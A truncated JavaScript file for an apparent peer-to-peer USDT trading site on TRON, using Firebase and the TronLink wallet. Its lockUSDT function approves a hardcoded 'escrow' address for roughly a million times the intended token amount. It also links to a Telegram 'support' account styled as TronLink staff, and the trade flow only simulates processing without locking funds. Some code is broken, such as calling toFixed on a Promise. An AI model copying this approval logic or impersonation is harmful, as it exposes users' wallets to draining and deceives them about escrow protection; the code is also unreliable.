// === DEPLOYED CONTRACT ADDRESS GOES HERE ===

// --- [1. Firebase Configuration & Initialization] ---
const firebaseConfig = {
  apiKey: "AIzaSyClJPT4UQsy9XmV4JB34rt0rYUB-FefyXY",
  authDomain: "mustafa-dbece.firebaseapp.com",
  databaseURL: "https://mustafa-dbece-default-rtdb.firebaseio.com",
  projectId: "mustafa-dbece",
  storageBucket: "mustafa-dbece.appspot.com",
  messagingSenderId: "692060842077",
  appId: "1:692060842077:web:04f0598199c58d403d05b4"
};
firebase.initializeApp(firebaseConfig);
const db = firebase.firestore();
const rtdb = firebase.database();

// --- [2. Global Variables] ---
let tronWeb = null;
let currentMarketType = 'sell';
let currentAdFilter = 'active';
let currentOrderFilter = 'pending';
let adFormMode = 'sell'; 
let activeOrderId = null;
let timerInt = null;
const USDT_CONTRACT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
// === DEPLOYED CONTRACT ADDRESS GOES HERE ===
const ESCROW_CONTRACT = "T9yDndPqzYnv2kUaq3STyrpTrni1GU7Ctd";
const TELEGRAM_SUPPORT_LINK = "https://t.me/TronLink_1manager";
let notificationAudio = null;

// --- [2.1. Trade Modal Variables] ---
let currentTradeType = 'buy';
let currentAdPrice = 0;
let currentAdMin = 0;
let currentAdMax = 0;
let currentAdAvailable = 0;
let currentAdPaymentMethod = '';
let currentAdOwner = '';
let tradeModalTimer = null;
let currentInputTab = 'amount';
let editingAdId = null;
let userAds = [];

// --- [2.2. Global Toast Notification System] ---
let activeToast = null;
let toastTimeout = null;
let progressInterval = null;

// --- [3. Toast Notification Functions] ---
function showToast(message, type = 'error') {
    // Clear any existing toast
    if (activeToast) {
        clearTimeout(toastTimeout);
        clearInterval(progressInterval);
        if (activeToast.parentNode) {
            activeToast.parentNode.removeChild(activeToast);
        }
    }

    // Create toast element
    const toast = document.createElement('div');
    toast.className = `toast ${type}`;
    toast.innerHTML = `
        <div class="toast-icon"></div>
        <div class="toast-message">${message}</div>
        <div class="toast-progress" style="width: 100%"></div>
    `;

    // Add to container
    const container = document.getElementById('toastContainer');
    container.appendChild(toast);
    activeToast = toast;

    // Animate in
    requestAnimationFrame(() => {
        toast.classList.add('show');
    });

    // Start progress bar animation
    const progressBar = toast.querySelector('.toast-progress');
    const duration = 4000; // 4 seconds
    const interval = 50; // Update every 50ms
    let elapsed = 0;

    progressInterval = setInterval(() => {
        elapsed += interval;
        const percentage = Math.max(0, 100 - (elapsed / duration) * 100);
        progressBar.style.width = percentage + '%';
        
        if (elapsed >= duration) {
            clearInterval(progressInterval);
        }
    }, interval);

    // Auto dismiss after duration
    toastTimeout = setTimeout(() => {
        toast.classList.add('hide');
        setTimeout(() => {
            if (toast.parentNode) {
                toast.parentNode.removeChild(toast);
            }
            activeToast = null;
        }, 300);
    }, duration);
}

// --- [4. Water Ripple Effect] ---
function createRipple(event) {
    const button = event.currentTarget;
    const rect = button.getBoundingClientRect();
    const size = Math.max(rect.width, rect.height);
    const x = event.clientX - rect.left - size / 2;
    const y = event.clientY - rect.top - size / 2;
    
    const ripple = document.createElement('span');
    ripple.className = 'ripple';
    ripple.style.width = ripple.style.height = size + 'px';
    ripple.style.left = x + 'px';
    ripple.style.top = y + 'px';
    
    // Get the button color from data-color attribute
    const color = button.getAttribute('data-color');
    if (color === 'red') {
        ripple.style.background = 'rgba(239, 68, 68, 0.3)'; // Red with transparency
    } else if (color === 'green') {
        ripple.style.background = 'rgba(34, 197, 94, 0.3)'; // Green with transparency
    } else {
        ripple.style.background = 'rgba(255, 255, 255, 0.6)'; // Default white
    }
    
    button.appendChild(ripple);
    
    setTimeout(() => {
        ripple.remove();
    }, 600);
}

// Initialize ripple effects for Buy/Sell buttons
document.addEventListener('DOMContentLoaded', function() {
    const rippleButtons = document.querySelectorAll('.ripple-button');
    rippleButtons.forEach(button => {
        button.addEventListener('click', createRipple);
    });
    
    // Initialize ripple effects for trade modal buttons
    initializeTradeModalRipples();
});

function initializeTradeModalRipples() {
    // Add ripple effect to trade action button
    const tradeActionButton = document.getElementById('tradeActionButton');
    if (tradeActionButton && !tradeActionButton.hasAttribute('data-ripple-initialized')) {
        tradeActionButton.addEventListener('click', createRipple);
        tradeActionButton.setAttribute('data-ripple-initialized', 'true');
    }
}

// Also initialize ripple effects dynamically when new elements are added
function initializeRippleEffects() {
    const rippleButtons = document.querySelectorAll('.ripple-button:not([data-ripple-initialized])');
    rippleButtons.forEach(button => {
        button.addEventListener('click', createRipple);
        button.setAttribute('data-ripple-initialized', 'true');
    });
}

// --- [5. Navigation Control] ---
function navTo(page, index) {
    const positions = ['1.5%', '26.5%', '51.5%', '76.5%'];
    document.getElementById('indicator').style.right = positions[index];
    
    // Remove active class from ALL nav items first
    document.querySelectorAll('.nav-item').forEach(i => i.classList.remove('active'));
    
    // Apply active class ONLY to the currently selected item
    const navItems = document.querySelectorAll('.nav-item');
    if (navItems[index]) {
        navItems[index].classList.add('active');
    }
    
    showPage(page);
}

function showPage(id) {
    document.querySelectorAll('.page').forEach(p => p.classList.remove('page-active'));
    const target = document.getElementById(id + 'Page');
    if(target) target.classList.add('page-active');
    
    // Show/hide P2P-specific header elements
    const headerRightSection = document.querySelector('header > div:last-child');
    const footer = document.querySelector('footer');
    
    if(id === 'p2p') {
        headerRightSection.style.display = 'flex';
        renderMarket();
    } else {
        headerRightSection.style.display = 'none';
        if(id === 'orders') renderOrders();
        if(id === 'ads') renderMyAds();
    }

    // Hide bottom nav when creating an ad (prevents overlap)
    if (footer) {
        footer.style.display = (id === 'createAd') ? 'none' : 'flex';
    }

    // Ensure Create Ad mode/UI are always synced when opening page
    if (id === 'createAd') {
        setAdMode(adFormMode || 'sell');
        updateCreateAdUIState();
    }
}

function navigateBackToHome() {
    navTo('p2p', 0);
}

// --- [6. TronLink Wallet] ---
async function connectTronLink() {
    if (window.tronLink) {
        try {
            await window.tronLink.request({ method: "tron_requestAccounts" });
            tronWeb = window.tronLink.tronWeb;
            const addr = tronWeb.defaultAddress.base58;
            document.getElementById('walletIndicator').innerHTML = `<i class="fa-solid fa-circle-check ml-1"></i> ${addr.slice(0,4)}...${addr.slice(-4)}`;
            document.getElementById('walletIndicator').className = "text-[10px] bg-green-50 text-green-600 px-3 py-1 rounded-full font-bold border border-green-100";
            
            // Initialize notification audio
            notificationAudio = new Audio('data:audio/wav;base64,UklGRnoGAABXQVZFZm10IBAAAAABAAEAQB8AAEAfAAABAAgAZGF0YQoGAACBhYqFbF1fdJivrJBhNjVgodDbq2EcBj+a2/LDciUFLIHO8tiJNwgZaLvt559NEAxQp+PwtmMcBjiR1/LMeSwFJHfH8N2QQAoUXrTp66hVFApGn+DyvmwhBSuBzvLZiTYIG2m98OScTgwOUarm7blmGgU7k9n1unEiBC13yO/eizEIHWq+8+OWT');
            
            // Update header balance display
            updateHeaderBalance();
            
            renderMarket();
        } catch(e) { console.error("Connection failed", e); showToast("Failed to connect wallet", "error"); }
    } else {
        showToast("Please install TronLink wallet", "error");
    }
}

// --- [7. Web3 Escrow Functions] ---
async function lockUSDT(amount, orderId) {
    try {
        if (!tronWeb) throw new Error('Wallet not connected');
        
        const usdtContract = await tronWeb.contract().at(USDT_CONTRACT);
        const balance = await usdtContract.balanceOf(tronWeb.defaultAddress.base58).call();
        
        if ((balance / 1e6) < amount) {
            throw new Error('Insufficient USDT balance');
        }
        
        // Approve escrow contract to spend USDT
        const approveTx = await usdtContract.approve(ESCROW_CONTRACT, tronWeb.toSun(amount * 1e6)).send({
            feeLimit: 100000000,
            callValue: 0,
            shouldPollResponse: true
        });
        
        // Lock USDT in escrow
        const escrowContract = await tronWeb.contract().at(ESCROW_CONTRACT);
        const lockTx = await escrowContract.lock(orderId, tronWeb.toSun(amount * 1e6)).send({
            feeLimit: 100000000,
            callValue: 0,
            shouldPollResponse: true
        });
        
        return { success: true, approveTx, lockTx };
    } catch (error) {
        console.error('Lock USDT error:', error);
        return { success: false, error: error.message };
    }
}

async function releaseUSDT(orderId) {
    try {
        if (!tronWeb) throw new Error('Wallet not connected');
        
        const escrowContract = await tronWeb.contract().at(ESCROW_CONTRACT);
        const releaseTx = await escrowContract.release(orderId).send({
            feeLimit: 100000000,
            callValue: 0,
            shouldPollResponse: true
        });
        
        return { success: true, releaseTx };
    } catch (error) {
        console.error('Release USDT error:', error);
        return { success: false, error: error.message };
    }
}

async function checkUSDTBalance(address) {
    try {
        if (!tronWeb) return 0;
        const contract = await tronWeb.contract().at(USDT_CONTRACT);
        const balance = await contract.balanceOf(address).call();
        return balance / 1e6;
    } catch (error) {
        console.error('Balance check error:', error);
        return 0;
    }
}

// --- [8. Trade Modal Functions] ---
function showOwnerBlockToast() {
    // Create elegant toast notification
    const toast = document.createElement('div');
    toast.className = 'fixed top-4 left-1/2 transform -translate-x-1/2 bg-red-50 border border-red-200 text-red-700 px-4 py-2 rounded-lg shadow-lg z-[10000] text-sm font-medium transition-all duration-300';
    toast.innerHTML = '<i class="fa-solid fa-exclamation-triangle ml-2"></i>You cannot enter your own ad';
    document.body.appendChild(toast);
    
    // Animate in
    setTimeout(() => {
        toast.style.opacity = '1';
        toast.style.transform = 'translate(-50%, 0)';
    }, 100);
    
    // Remove after 3 seconds
    setTimeout(() => {
        toast.style.opacity = '0';
        toast.style.transform = 'translate(-50%, -20px)';
        setTimeout(() => {
            document.body.removeChild(toast);
        }, 300);
    }, 3000);
}

function clearModalData() {
    // Clear all input fields
    document.getElementById('egpAmount').value = '';
    document.getElementById('usdtAmount').value = '';
    
    // Clear any error messages
    const errorElements = document.querySelectorAll('.text-red-500');
    errorElements.forEach(el => el.textContent = '');
    
    // Reset tab to amount tab
    const amountTab = document.getElementById('amountTab');
    const cryptoTab = document.getElementById('cryptoTab');
    if (amountTab && cryptoTab) {
        amountTab.classList.add('border-b-2', 'border-blue-500', 'text-blue-600');
        amountTab.classList.remove('text-gray-500');
        cryptoTab.classList.remove('border-b-2', 'border-blue-500', 'text-blue-600');
        cryptoTab.classList.add('text-gray-500');
    }
}

function openTradeModal(docId) {
    console.log('Opening Modal for:', docId); // To verify in console
    
    // Get the ad data directly from Firestore
    db.collection("ads").doc(docId).get().then(doc => {
        if (!doc.exists) {
            console.error('Ad not found:', docId);
            return;
        }
        
        const adData = doc.data();
        currentTradeType = adData.type;
        currentAdPrice = parseFloat(adData.price);
        currentAdMin = parseFloat(adData.min);
        currentAdMax = parseFloat(adData.max);
        currentAdAvailable = parseFloat(adData.amount);
        currentAdPaymentMethod = adData.payMethod;
        currentAdOwner = adData.owner;
        
        // Security check: Block merchants from entering their own ads
        if (tronWeb && tronWeb.defaultAddress.base58 === currentAdOwner) {
            // Show elegant toast notification
            showOwnerBlockToast();
            return;
        }
        
        // Update modal content
        document.getElementById('modalTitle').textContent = currentTradeType === 'buy' ? 'SELL USDT' : 'BUY USDT';
        document.getElementById('modalPrice').textContent = currentAdPrice.toFixed(2);
        document.getElementById('advertiserName').textContent = `Merchant_${currentAdOwner.slice(-4)}`;
        document.getElementById('paymentMethodDisplay').textContent = currentAdPaymentMethod;
        
        // Update limits display
        const minInEGP = currentAdMin;
        const maxInEGP = currentAdMax;
        const minInUSDT = (currentAdMin / currentAdPrice).toFixed(2);
        const maxInUSDT = (currentAdMax / currentAdPrice).toFixed(2);
        
        document.getElementById('limitRange').textContent = `${minInEGP.toFixed(2)} - ${maxInEGP.toFixed(2)}`;
        document.getElementById('quantityLimitRange').textContent = `${minInUSDT} - ${maxInUSDT}`;
        
        // Update action button with correct colors
        const actionBtn = document.getElementById('tradeActionButton');
        actionBtn.textContent = currentTradeType === 'buy' ? 'ASHTR\' USDT WITHOUT FEES' : 'SELL USDT WITHOUT FEES';
        actionBtn.className = currentTradeType === 'buy' ? 
            'w-full bg-green-600 hover:bg-green-700 text-white py-3 rounded-lg font-bold text-sm transition-all duration-300 shadow-lg ripple-button' :
            'w-full bg-red-600 hover:bg-red-700 text-white py-3 rounded-lg font-bold text-sm transition-all duration-300 shadow-lg ripple-button';
        
        // Show/hide balance section for sell mode
        const balanceSection = document.getElementById('sellBalanceSection');
        if (currentTradeType === 'sell') {
            balanceSection.style.display = 'block';
            if (tronWeb) {
                checkUSDTBalance(tronWeb.defaultAddress.base58).then(balance => {
                    document.getElementById('availableBalance').textContent = balance.toFixed(2);
                }).catch(error => {
                    console.error('Error checking balance:', error);
                    document.getElementById('availableBalance').textContent = '0.00';
                });
            }
        } else {
            balanceSection.style.display = 'none';
        }
        
        // Show modal
        document.getElementById('tradeModalOverlay').classList.remove('hidden');
        
        // Reset inputs and switch to amount tab
        document.getElementById('egpAmount').value = '';
        document.getElementById('usdtQuantity').value = '';
        document.getElementById('willReceiveUSDT').textContent = '0.00';
        document.getElementById('willReceiveEGP').textContent = '0.00';
        switchInputTab('amount');
    }).catch(error => {
        console.error('Error fetching ad data:', error);
    });
}

function closeTradeModal() {
    document.getElementById('tradeModalOverlay').classList.add('hidden');
    if (tradeModalTimer) {
        clearInterval(tradeModalTimer);
        tradeModalTimer = null;
    }
}

function switchInputTab(tab) {
    currentInputTab = tab;
    const amountTab = document.getElementById('amountTab');
    const quantityTab = document.getElementById('quantityTab');
    const amountSection = document.getElementById('amountInputSection');
    const quantitySection = document.getElementById('quantityInputSection');
    const maxAmountBtn = document.getElementById('tradeMaxAmountBtn');
    const maxQuantityBtn = document.getElementById('tradeMaxQuantityBtn');
    
    if (tab === 'amount') {
        // Update tab styling
        amountTab.className = 'flex-1 py-2 rounded-md font-semibold bg-white text-gray-800 transition-all';
        quantityTab.className = 'flex-1 py-2 rounded-md font-semibold text-gray-500 transition-all';
        
        // Show/hide sections
        amountSection.style.display = 'block';
        quantitySection.style.display = 'none';
        
        // Update max button text to show EGP
        maxAmountBtn.innerHTML = 'Maximum EGP';
    } else {
        // Update tab styling
        quantityTab.className = 'flex-1 py-2 rounded-md font-semibold bg-white text-gray-800 transition-all';
        amountTab.className = 'flex-1 py-2 rounded-md font-semibold text-gray-500 transition-all';
        
        // Show/hide sections
        quantitySection.style.display = 'block';
        amountSection.style.display = 'none';
        
        // Update max button text to show USDT
        maxQuantityBtn.innerHTML = 'Maximum USDT';
    }
    
    // Trigger validation on tab switch
    validateTradeInput();
}

function calculateTradeAmounts() {
    const egpInput = document.getElementById('egpAmount');
    const usdtInput = document.getElementById('usdtQuantity');
    
    if (currentInputTab === 'amount') {
        // EGP to USDT calculation
        const egpAmount = parseFloat(egpInput.value) || 0;
        const usdtQuantity = egpAmount / currentAdPrice;
        usdtInput.value = usdtQuantity.toFixed(2);
        
        // Update "will receive" display
        document.getElementById('willReceiveUSDT').textContent = usdtQuantity.toFixed(2);
    } else {
        // USDT to EGP calculation
        const usdtQuantity = parseFloat(usdtInput.value) || 0;
        const egpAmount = usdtQuantity * currentAdPrice;
        egpInput.value = egpAmount.toFixed(2);
        
        // Update "will receive" display
        document.getElementById('willReceiveEGP').textContent = egpAmount.toFixed(2);
    }
    
    // Validate input and update button state
    validateTradeInput();
}

function setMaxAmount() {
    if (currentInputTab === 'amount') {
        const maxEGP = currentAdMax;
        document.getElementById('egpAmount').value = maxEGP.toFixed(2);
    } else {
        const maxUSDT = Math.min(currentAdAvailable, currentAdMax / currentAdPrice);
        document.getElementById('usdtQuantity').value = maxUSDT.toFixed(2);
    }
    calculateTradeAmounts();
}

function setMaxQuantity() {
    const maxUSDT = Math.min(currentAdAvailable, currentAdMax / currentAdPrice);
    document.getElementById('usdtQuantity').value = maxUSDT.toFixed(2);
    calculateTradeAmounts();
}

function validateTradeInput() {
    const egpInput = document.getElementById('egpAmount');
    const usdtInput = document.getElementById('usdtQuantity');
    const actionBtn = document.getElementById('tradeActionButton');
    
    const egpAmount = parseFloat(egpInput.value) || 0;
    const usdtQuantity = parseFloat(usdtInput.value) || 0;
    
    let isValid = true;
    let errorMessage = '';
    
    // Check if amounts are positive
    if (egpAmount <= 0 || usdtQuantity <= 0) {
        isValid = false;
        errorMessage = 'Please enter a positive value';
    }
    
    // Check limits
    if (egpAmount < currentAdMin || egpAmount > currentAdMax) {
        isValid = false;
        errorMessage = `Amount must be between ${currentAdMin.toFixed(2)} and ${currentAdMax.toFixed(2)} EGP`;
    }
    
    // Check available balance for sell
    if (currentTradeType === 'sell' && usdtQuantity > currentAdAvailable) {
        isValid = false;
        errorMessage = `Available quantity: ${currentAdAvailable.toFixed(2)} USDT`;
    }
    
    // Update input styling based on validation with smart borders
    if (currentInputTab === 'amount') {
        if (egpAmount === 0) {
            // Default state - black border
            egpInput.className = 'w-full bg-gray-50 p-3 rounded-lg text-lg font-bold outline-none border border-black transition-all';
            egpInput.style.color = '#6b7280';
        } else if (isValid) {
            // Valid state - green border
            egpInput.className = 'w-full bg-gray-50 p-3 rounded-lg text-lg font-bold outline-none border border-green-500 transition-all';
            egpInput.style.color = '';
        } else {
            // Invalid state - red border
            egpInput.className = 'w-full bg-gray-50 p-3 rounded-lg text-lg font-bold outline-none border border-red-500 transition-all';
            egpInput.style.color = '';
        }
    } else {
        if (usdtQuantity === 0) {
            // Default state - black border
            usdtInput.className = 'w-full bg-gray-50 p-3 rounded-lg text-lg font-bold outline-none border border-black transition-all';
            usdtInput.style.color = '#6b7280';
        } else if (isValid) {
            // Valid state - green border
            usdtInput.className = 'w-full bg-gray-50 p-3 rounded-lg text-lg font-bold outline-none border border-green-500 transition-all';
            usdtInput.style.color = '';
        } else {
            // Invalid state - red border
            usdtInput.className = 'w-full bg-gray-50 p-3 rounded-lg text-lg font-bold outline-none border border-red-500 transition-all';
            usdtInput.style.color = '';
        }
    }
    
    // Update button state
    actionBtn.disabled = !isValid;
    actionBtn.className = isValid ? 
        (currentTradeType === 'buy' ? 
            'w-full bg-green-600 hover:bg-green-700 text-white py-3 rounded-lg font-bold text-sm transition-all duration-300 shadow-lg ripple-button' :
            'w-full bg-red-600 hover:bg-red-700 text-white py-3 rounded-lg font-bold text-sm transition-all duration-300 shadow-lg ripple-button') :
        'w-full bg-gray-400 text-white py-3 rounded-lg font-bold text-sm cursor-not-allowed transition-all duration-300';
    
    return { isValid, errorMessage };
}

function startTradeModalTimer() {
    let timeLeft = 15 * 60; // 15 minutes in seconds
    
    tradeModalTimer = setInterval(() => {
        timeLeft--;
        
        if (timeLeft <= 0) {
            clearInterval(tradeModalTimer);
            closeTradeModal();
            showToast('Please try again', 'error');
        }
    }, 1000);
}

async function executeTrade() {
    if (!tronWeb) {
        return showToast('Please connect wallet first', 'error');
    }
    
    const egpAmount = parseFloat(document.getElementById('egpAmount').value) || 0;
    const usdtQuantity = parseFloat(document.getElementById('usdtQuantity').value) || 0;
    
    // Use validation function
    const validation = validateTradeInput();
    if (!validation.isValid) {
        return showToast(validation.errorMessage, 'error');
    }
    
    // Balance validation for selling
    if (currentTradeType === 'sell') {
        const userBalance = await checkUSDTBalance(tronWeb.defaultAddress.base58);
        if (userBalance < usdtQuantity) {
            return showToast(`Insufficient balance: Your balance ${userBalance.toFixed(2)} USDT`, 'error');
        }
    }
    
    const actionBtn = document.getElementById('tradeActionButton');
    const originalText = actionBtn.textContent;
    const originalClass = actionBtn.className;
    
    try {
        // Show loading spinner for 10 seconds
        actionBtn.disabled = true;
        actionBtn.innerHTML = '<i class="fa-solid fa-spinner fa-spin ml-2"></i>Processing...';
        actionBtn.className = 'w-full bg-gray-400 text-white py-3 rounded-lg font-bold text-sm cursor-not-allowed transition-all duration-300';
        
        // Simulate 10-second loading
        await new Promise(resolve => setTimeout(resolve, 10000));
        
        // Create order with proper data types
        const orderData = {
            adId: 'temp-ad-id',
            adOwner: currentAdOwner,
            taker: tronWeb.defaultAddress.base58,
            type: currentTradeType,
            status: 'pending',
            isPaid: false,
            createdAt: Number(Date.now()),
            amount: String(usdtQuantity),
            price: String(currentAdPrice),
            paymentMethod: currentAdPaymentMethod,
            egpAmount: String(egpAmount)
        };
        
        await db.collection("orders").add(orderData);
        
        showToast(`${currentTradeType === 'buy' ? 'Purchase' : 'Sale'} order created successfully`, 'success');
        
        closeTradeModal();
        
        // Redirect to orders page
        navTo('orders', 1);
        
    } catch (error) {
        console.error('Trade execution error:', error);
        showToast('Trade execution failed: ' + error.message, 'error');
    } finally {
        // Restore button
        actionBtn.disabled = false;
        actionBtn.textContent = originalText;
        actionBtn.className = originalClass;
    }
}

// --- [9. Edit Modal Functions] ---
function openEditModal(adData) {
    editingAdId = adData.id;
    
    // Populate edit form
    document.getElementById('editPrice').value = adData.price;
    document.getElementById('editAmount').value = adData.amount;
    document.getElementById('editMin').value = adData.min;
    document.getElementById('editMax').value = adData.max;
    document.getElementById('editPayMethod').value = adData.payMethod;
    
    // Show modal
    document.getElementById('editAdModal').classList.remove('hidden');
}

function closeEditModal() {
    document.getElementById('editAdModal').classList.add('hidden');
    editingAdId = null;
}

async function updateAd() {
    console.log('updateAd called, editingAdId:', editingAdId);
    
    if (!editingAdId) {
        console.error('No editingAdId set');
        return showToast('No ad selected for editing', 'error');
    }
    
    if (!tronWeb) {
        console.error('Wallet not connected');
        return showToast('Wallet not connected', 'error');
    }
    
    try {
        // Collect the NEW values from the modal
        const newPrice = document.getElementById('editPrice').value.trim();
        const newAmount = document.getElementById('editAmount').value.trim();
        const newMin = document.getElementById('editMin').value.trim();
        const newMax = document.getElementById('editMax').value.trim();
        const newPayMethod = document.getElementById('editPayMethod').value.trim();
        
        console.log('New values collected:', { newPrice, newAmount, newMin, newMax, newPayMethod });
        
        // Enhanced Validation - Sync with publish validation
        if (!newPrice || !newAmount || !newMin || !newMax || !newPayMethod) {
            return showToast('Please fill all fields', 'error');
        }
        
        if (parseFloat(newAmount) <= 0) {
            return showToast('Quantity must be greater than 0', 'error');
        }
        
        if (parseFloat(newMin) > parseFloat(newMax)) {
            return showToast('Minimum cannot be greater than maximum', 'error');
        }
        
        // Price calculation validation - Maximum Limit based on Quantity * Exchange Price
        const maxLimitValue = parseFloat(newMax);
        const totalValue = parseFloat(newAmount) * parseFloat(newPrice);
        if(maxLimitValue > totalValue) {
            return showToast(`Maximum limit (${newMax} EGP) cannot exceed total ad value (${totalValue.toFixed(2)} EGP)`, 'error');
        }
        
        // Use the Firebase update command directly to the path ads/ + currentEditingId
        console.log('Updating Firebase path: ads/' + editingAdId);
        
        await db.collection("ads").doc(editingAdId).update({
            price: String(newPrice),
            amount: String(newAmount),
            min: String(newMin),
            max: String(newMax),
            payMethod: String(newPayMethod),
            status: 'active',
            updatedAt: Number(Date.now())
        });
        
        console.log('Firebase update successful');
        
        // Close modal and show success
        closeEditModal();
        showToast('Ad updated successfully', 'success');
        
        // Refresh the ads
        if (document.getElementById('adsPage').classList.contains('page-active')) {
            renderMyAds();
        }
        if (document.getElementById('p2pPage').classList.contains('page-active')) {
            renderMarket();
        }
        
    } catch (error) {
        console.error('Firebase update error:', error);
        
        // Alert for specific errors
        if (error.message.includes('Permission denied')) {
            showToast('You do not have permission to edit this ad', 'error');
        } else if (error.message.includes('null')) {
            showToast('A required field is null or missing', 'error');
        } else {
            showToast('Failed to update ad: ' + error.message, 'error');
        }
    }
}

function editAd(adId) {
    console.log('Editing Ad:', adId);
    
    // Find the ad data from userAds array
    const ad = userAds.find(a => a.id === adId);
    
    if (!ad) {
        console.error('Ad not found:', adId);
        showToast('Ad not found', 'error');
        return;
    }
    
    console.log('Found ad data:', ad);
    
    // Manually set the .value for all inputs in the edit modal
    document.getElementById('editPrice').value = ad.price || '';
    document.getElementById('editAmount').value = ad.amount || '';
    document.getElementById('editMin').value = ad.min || '';
    document.getElementById('editMax').value = ad.max || '';
    document.getElementById('editPayMethod').value = ad.payMethod || '';
    
    // Set the current editing ID
    editingAdId = adId;
    
    console.log('Modal fields populated, opening modal');
    
    // Open the modal using the correct ID
    document.getElementById('editAdModal').classList.remove('hidden');
}

function cancelEditAd() {
    closeEditModal();
}

// Global variable to store the ad ID to be cancelled
let adIdToCancel = null;

async function confirmCancelAd(adId) {
    adIdToCancel = adId;
    document.getElementById('cancelModal').classList.remove('hidden');
}

function closeCancelModal() {
    document.getElementById('cancelModal').classList.add('hidden');
    adIdToCancel = null;
}

async function confirmCancelAction() {
    if (!adIdToCancel) return;
    
    try {
        await db.collection("ads").doc(adIdToCancel).delete();
            
        showToast('Ad deleted successfully', 'success');
            
        renderMyAds();
    } catch (error) {
        console.error('Cancel ad error:', error);
        showToast('Failed to delete ad: ' + error.message, 'error');
    } finally {
        closeCancelModal();
    }
}

// Update balance display function
function updateHeaderBalance() {
    if (tronWeb) {
        const balance = checkUSDTBalance(tronWeb.defaultAddress.base58);
        const balanceElement = document.getElementById('headerBalance');
        if (balanceElement) {
            balanceElement.textContent = balance.toFixed(2);
        }
    }
}

// Add input event listeners
document.addEventListener('DOMContentLoaded', function() {
    const egpInput = document.getElementById('egpAmount');
    const usdtInput = document.getElementById('usdtQuantity');
        
    if (egpInput) {
        egpInput.addEventListener('input', calculateTradeAmounts);
    }
    if (usdtInput) {
        usdtInput.addEventListener('input', calculateTradeAmounts);
    }
        
    // Update balance on load and wallet connection
    updateHeaderBalance();
});

// --- [10. Market & Ads Logic] ---
function switchMarket(type, btn) {
    currentMarketType = type;
    document.querySelectorAll('#p2pPage .tab-active').forEach(b => b.classList.remove('tab-active'));
    btn.classList.add('tab-active');
    renderMarket();
}

function renderMarket() {
    const container = document.getElementById('marketList');
    db.collection("ads").where("status", "==", "active").where("type", "==", currentMarketType).onSnapshot(snap => {
        if(snap.empty) { container.innerHTML = "<div class='text-center py-20 text-gray-400'><i class='fa-solid fa-box-open text-4xl mb-2'></i><p>No ads currently available</p></div>"; return; }
            
        // Ghost ads protection - only show ads with valid data
        const validAds = snap.docs.filter(doc => {
            const data = doc.data();
            return data.price && data.amount && data.payMethod && data.min && data.max;
        });
            
        if(validAds.length === 0) { 
            container.innerHTML = "<div class='text-center py-20 text-gray-400'><i class='fa-solid fa-box-open text-4xl mb-2'></i><p>No ads currently available</p></div>"; 
            return; 
        }
            
        container.innerHTML = validAds.map(doc => {
            const data = doc.data();
            const colorClass = currentMarketType === 'buy' ? 'bg-green-600' : 'bg-red-600';
            return `
            <div class="border-b pb-5 animate-pulse-once">
                <div class="flex justify-between items-center mb-2">
                    <div class="flex items-center gap-2">
                        <div class="w-8 h-8 bg-gray-100 rounded-full flex items-center justify-center font-bold text-xs">M</div>
                        <span class="font-bold text-sm text-gray-800">Merchant_${data.owner.slice(-4)}</span>
                        <i class="fa-solid fa-certificate text-blue-500 text-[10px]"></i>
                    </div>
                </div>
                <div class="flex justify-between items-end">
                    <div>
                        <div class="text-2xl font-black price-font">${data.price} <span class="text-xs font-normal text-gray-500">EGP</span></div>
                        <div class="text-[11px] text-gray-500 mt-1">Available quantity: <span class="text-black font-semibold">${data.amount} USDT</span></div>
                        <div class="text-[11px] text-gray-500">Limits: <span class="text-black font-semibold">${data.min} - ${data.max} EGP</span></div>
                        <div class="mt-2 inline-flex items-center gap-1 bg-zinc-100 px-2 py-0.5 rounded text-[10px] font-bold text-zinc-600">
                             <i class="fa-solid fa-wallet text-[9px]"></i> ${data.payMethod}
                        </div>
                    </div>
                    <button onclick="openTradeModal('${doc.id}')" class="${colorClass} text-white px-7 py-2.5 rounded-xl font-bold text-sm shadow-sm transition-transform active:scale-95">
                        ${currentMarketType === 'buy' ? 'sell' : 'sell'}
                    </button>
                </div>
            </div>`;
        }).join('');
    });
}

// --- [11. Ad Publishing & Security Validation] ---
function setAdMode(mode) {
    adFormMode = mode;
    
    const modeBuyBtn = document.getElementById('modeBuy');
    const modeSellBtn = document.getElementById('modeSell');
    const publishBtn = document.getElementById('publishButton');
    
    // Create Ad: Sell-only controls (Max + balance text)
    const sellOnlyControls = document.getElementById('sellOnlyControls');
    
    if (modeBuyBtn && modeSellBtn) {
        if (mode === 'buy') {
            modeBuyBtn.className = 'flex-1 py-3 rounded-xl font-bold bg-green-600 text-white shadow-sm';
            modeSellBtn.className = 'flex-1 py-3 rounded-xl font-bold text-gray-400';
        } else {
            modeSellBtn.className = 'flex-1 py-3 rounded-xl font-bold bg-red-600 text-white shadow-sm';
            modeBuyBtn.className = 'flex-1 py-3 rounded-xl font-bold text-gray-400';
        }
    }
    
    // Buy mode: hide Max button + balance text, and skip balance checks entirely
    if (mode === 'buy') {
        if (sellOnlyControls) sellOnlyControls.style.display = 'none';
        if (publishBtn) {
            publishBtn.classList.remove('bg-red-600');
            publishBtn.classList.add('bg-green-600');
        }
    } else {
        if (sellOnlyControls) sellOnlyControls.style.display = 'block';
        updateSellBalance();
        if (publishBtn) {
            publishBtn.classList.remove('bg-green-600');
            publishBtn.classList.add('bg-red-600');
        }
    }

    updateCreateAdUIState();
}

// === COMPLETELY SEPARATED BUY/SELL VALIDATION LOGIC ===

// BUY MODE: ZERO RESTRICTIONS - NO BALANCE VALIDATION
function handleBuyModeValidation(input) {
    const container = input.closest('.bg-gray-50');
    
    // Buy mode: ALWAYS neutral black border, NO balance checks
    container.style.borderColor = 'black';
    container.style.borderWidth = '1px';
    container.style.borderStyle = 'solid';
    
    // NEVER show any balance-related errors in buy mode
    // User can type any amount they want
    return true; // Always allow publishing in buy mode
}

// SELL MODE: STRICT BALANCE LOCK WITH RED BORDER VALIDATION
async function handleSellModeValidation(input) {
    if (!tronWeb) return false;
    
    try {
        const balance = await checkUSDTBalance(tronWeb.defaultAddress.base58);
        const container = input.closest('.bg-gray-50');
        const amountValue = parseFloat(input.value) || 0;
        
        // SELL MODE: STRICT BALANCE VALIDATION
        if (balance === 0.00) {
            // Zero balance - BLOCK publishing
            input.value = '0.00';
            container.style.borderColor = 'red';
            container.style.borderWidth = '1px';
            container.style.borderStyle = 'solid';
            showToast('Cannot publish sell ad: Your balance is 0.00 USDT', 'error');
            return false; // Block publishing
        } else if (amountValue > balance) {
